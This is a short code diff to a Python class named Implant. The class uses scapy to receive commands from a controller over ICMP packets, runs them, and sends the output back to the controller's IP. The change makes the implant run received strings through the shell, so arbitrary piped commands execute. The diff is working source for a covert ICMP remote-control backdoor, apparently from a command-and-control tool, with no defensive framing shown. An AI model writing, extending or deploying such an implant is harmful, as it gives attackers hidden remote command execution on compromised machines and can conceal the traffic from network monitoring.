@@ -3,7 +3,7 @@
 from scapy.all import sr,IP,ICMP,Raw,sniff
 import base64
 from shellylib import Host
-from subprocess import STDOUT, check_output, TimeoutExpired
+from subprocess import STDOUT, check_output, TimeoutExpired, PIPE, Popen
 
 ICMP_ID = int(12800)
 TTL = int(64)
@@ -20,8 +20,9 @@ class Implant(Host):
     def instruction(self, shellpack):
         try:
             cmd = shellpack['data'].decode()
-            cmd = cmd.split(" ")
-            output = check_output(cmd, stderr=STDOUT, timeout=3)
+            # cmds = cmd.split("|")
+            #cmd = cmd.split(" ")
+            output = check_output(cmd, stderr=STDOUT, timeout=3, shell=True)
             
             self.send(self.controller_ip, "instruction", output)
         except TimeoutExpired:
